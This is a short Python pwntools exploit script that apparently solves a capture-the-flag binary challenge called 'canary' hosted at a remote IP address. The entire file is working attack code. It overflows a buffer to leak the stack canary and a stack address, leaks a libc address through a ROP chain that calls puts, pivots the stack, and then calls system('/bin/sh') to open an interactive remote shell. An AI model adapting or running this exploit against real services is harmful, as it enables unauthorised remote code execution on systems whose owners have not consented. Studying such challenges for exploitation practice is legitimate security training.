from pwn import *

# p = process("./canary")
p = remote("35.202.65.196", 1337)
libc = ELF("./libc.so.6")

print(p.recvuntil(":"))
p.send("A" * 0x49)
p.recvuntil("?")
leak = p.recvline()
leak = p.recvline()[0x49:]
canary = "\x00" + leak[:7]
stack_leak = leak[7:].split("\n")[0] + "\x00\x00"
canary = u64(canary)
stack_leak = u64(stack_leak)
print("[*] Canary leak: " + hex(canary))
print("[*] Stack leak: " + hex(stack_leak))
p.send('n')
ret = 0x40101a
pop_rdi = 0x401373
puts_plt = 0x4010a0
puts_got = 0x404018
vuln = 0x4011f6
leave_ret = 0x4012b4
payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln) + p64(leave_ret) +p64(ret)
p.send(p64(ret) * ((0x48 - len(payload)) // 8) + payload + p64(canary) + p64(stack_leak - 0x70))
print(p.recvuntil("Thank you"))
p.recvline()
libc_leak = p.recvline()[:6] + "\x00\x00"
libc_leak = u64(libc_leak)
print("[*] Libc leak: " + hex(libc_leak))
libc_base = libc_leak - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
p.send(p64(stack_leak) + p64(pop_rdi) + p64(stack_leak - 0x68) + p64(ret) + p64(system) + "/bin/sh\x00" + "A" * 0x18 + p64(canary) + p64(stack_leak - 0x48 - 0x48))
p.send('y')
p.interactive()